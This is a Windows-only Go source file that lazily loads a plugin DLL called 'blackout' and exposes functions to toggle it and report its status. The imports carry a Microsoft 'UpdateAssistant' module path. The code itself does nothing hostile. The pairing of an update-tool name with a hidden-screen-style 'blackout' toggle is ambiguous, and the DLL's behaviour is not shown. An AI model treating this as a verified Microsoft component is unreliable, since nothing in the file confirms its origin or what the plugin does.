//go:build windows

package sysutil

import (
	"sync"

	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
	blackoutDLL *loader.Plugin
	blackoutMu  sync.Mutex
)

func loadBlackout() {
	blackoutMu.Lock()
	defer blackoutMu.Unlock()
	if blackoutDLL != nil {
		return
	}
	dll, err := loader.Load("blackout")
	if err != nil {
		logger.Error("[blackout] load failed: %v", err)
		return
	}
	blackoutDLL = dll
}

func BlackoutToggle() {
	loadBlackout()
	blackoutMu.Lock()
	dll := blackoutDLL
	blackoutMu.Unlock()
	if dll == nil {
		return
	}
	dll.Call("blackout_toggle")
}

func BlackoutStatus() bool {
	loadBlackout()
	blackoutMu.Lock()
	dll := blackoutDLL
	blackoutMu.Unlock()
	if dll == nil {
		return false
	}
	status, _ := dll.Call("blackout_status")
	return status != 0
}

func BlackoutStatusStr() string {
	if BlackoutStatus() {
		return "enabled"
	}
	return "disabled"
}
